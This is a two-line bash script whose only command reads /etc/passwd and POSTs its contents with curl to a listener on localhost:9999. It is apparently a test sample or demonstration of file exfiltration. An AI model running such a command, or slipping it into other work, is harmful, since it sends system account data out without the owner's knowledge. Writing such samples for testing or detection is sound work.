#!/bin/bash

curl -X POST -d "$(cat /etc/passwd)" localhost:9999
